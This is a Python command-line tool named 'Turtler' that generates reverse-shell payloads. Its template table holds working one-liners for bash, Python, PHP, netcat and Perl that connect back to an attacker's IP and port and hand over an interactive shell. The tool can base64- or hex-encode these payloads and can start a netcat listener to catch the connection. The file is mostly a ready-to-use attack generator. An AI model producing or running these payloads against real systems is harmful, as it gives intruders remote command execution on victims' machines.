import argparse
import os
import sys
from colorama import Fore, Style
import socket
import fcntl
import struct
import base64
import subprocess
import random
import urllib.parse


TEMPLATES = {
    "bash":[
        "bash -i >& /dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT] 0>&1",
        "0<&196;exec 196<>/dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT]; bash <&196 >&196 2>&196"
    ],
    "python":[
        "export RHOST=\"[ATTACKER_IP]\";export RPORT=[ATTACKER_PORT];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"[SHELL]\")'",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[ATTACKER_IP]\",[ATTACKER_PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[SHELL]\")'"
    ],
    "php":[
        "php -r '$sock=fsockopen(\"[ATTACKER_IP]\",[ATTACKER_PORT]);exec(\"[SHELL] -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"[ATTACKER_IP]\",[ATTACKER_PORT]);system(\"[SHELL] -i <&3 >&3 2>&3\");'",
    ],
    "nc":[
        "nc -e [SHELL] [ATTACKER_IP] [ATTACKER_PORT]",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|[SHELL] -i 2>&1|nc [ATTACKER_IP] [ATTACKER_PORT] >/tmp/f"
    ],
    "perl":[
        "perl -e 'use Socket;$i=\"[ATTACKER_IP]\";$p=[ATTACKER_PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"        
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"[ATTACKER_IP]:[ATTACKER_PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    ]
}




def argument_parser():
    banner = f"""{Fore.GREEN}
  _____     ____    _______
 /      \\  |  o | < TURTLE)
|        |/ ___\\|   \\____/
|_________/
|_|_| |_|_|
{Style.RESET_ALL}
"""
    print(banner)
    parser = argparse.ArgumentParser(description=f"Turtler: Creates reverse shells... Get it?.")
    parser.add_argument('-i', '--ip-address', type=str, help='Your local IP or interface.',required=True)
    parser.add_argument('-p', '--port', type=int, help='The port to host the reverse shell on. If omitted will select a random one.', required=False)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output.', required=False)
    parser.add_argument('-t', '--type', type=str, choices=TEMPLATES.keys(), help='The type of reverse shell to create.', required=False, default='bash')
    parser.add_argument('-e', '--encode', type=str, choices=['base64','base64url', 'hex'], help='The encoding to use for the reverse shell.', required=False, default=None)
    parser.add_argument('-s', '--shell', type=str, choices=['bash', 'sh'], help='The shell to use (defaults to bash).', required=False, default='bash')
    parser.add_argument('--interactive', action='store_true', help='Start listening on netcat in the script (default: False).', required=False, default=False)
    return parser


class Turtler:

    def __init__(
                self,
                 ip_address_or_interface=None,
                 port=None,
                 reverse_shell_type=None,
                 shell = None,
                 encoding=None,
                 verbose=False,
                 interactive=False
                 ):
        self.ip_address_or_interface = ip_address_or_interface
        self.port = port
        self.shell_type = reverse_shell_type
        self.shell = shell
        self.encoding = encoding
        self.verbose = verbose
        self.interactive = interactive
        if not self.port:
            self.port = self.get_random_port()

        # Check if the IP is an IP address or an interface name
        if self.ip_address_or_interface and not self.is_valid_ip(self.ip_address_or_interface):
            # If it's not a valid IP, treat it as an interface name
            self.ip_address_or_interface = self.get_ip_address_from_interface(self.ip_address_or_interface)
            if not self.ip_address_or_interface:
                print(f"{Fore.RED}[-] Error: Could not determine IP address from interface '{self.ip_address_or_interface}'.{Style.RESET_ALL}")
                sys.exit(1)

    def is_valid_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def construct_payload(self):
        if self.shell_type not in TEMPLATES:
            print(f"{Fore.RED}[-] Error: Unsupported shell type '{self.shell_type}'. Supported types are: {', '.join(TEMPLATES.keys())}{Style.RESET_ALL}")
            sys.exit(1)

        for template in TEMPLATES[self.shell_type]:
            payload = template.replace("[ATTACKER_IP]", self.ip_address_or_interface).replace("[ATTACKER_PORT]", str(self.port)).replace("[SHELL]", self.shell)

            if self.encoding:
                header = f"{Fore.YELLOW} Before Encoding: {payload} {Style.RESET_ALL}\nAfter Encoding: "
                if self.encoding == 'base64':
                    payload = header + base64.b64encode(payload.encode('utf-8')).decode('utf-8')
                if self.encoding == 'base64url':
                    payload = header + urllib.parse.quote_plus(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
                elif self.encoding == 'hex':
                    payload = header + payload.encode('utf-8').hex()

            print(f"{Fore.GREEN}[+] Generated Payload:{Style.RESET_ALL}")
            print(payload + "\n")

    def catch_netcat(self):
        input(f"{Fore.GREEN}[+] Press enter to start listening on {self.ip_address_or_interface}:{self.port}...{Style.RESET_ALL}")
        # This doesn't work, spawns a netcat process but doesn't allow for interaction. Need to figure out how to do that.
        try:
            subprocess.run(['nc', '-lvnp', str(self.port)], check=True)
        except KeyboardInterrupt:
            quit_shell = print(f"{Fore.YELLOW}\n[!] Stopped listening on {self.ip_address_or_interface}:{self.port}. {Style.RESET_ALL}")
            print(quit_shell)
    @staticmethod
    def get_ip_address_from_interface(ifname):
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            try:
                return socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(),
                    0x8915,  # SIOCGIFADDR
                    struct.pack('256s', bytes(ifname[:15], 'utf-8'))
                )[20:24])
            except OSError:
                return None

    def get_random_port(self):
        return random.randint(1024, 65535)

if __name__ == "__main__":
    argument_parser = argument_parser()
    args = argument_parser.parse_args();
    turtler = Turtler(ip_address_or_interface=args.ip_address, port=args.port, reverse_shell_type=args.type,shell=args.shell, encoding=args.encode, verbose=args.verbose,interactive=args.interactive);
    turtler.construct_payload();
    if turtler.interactive:
        turtler.catch_netcat();





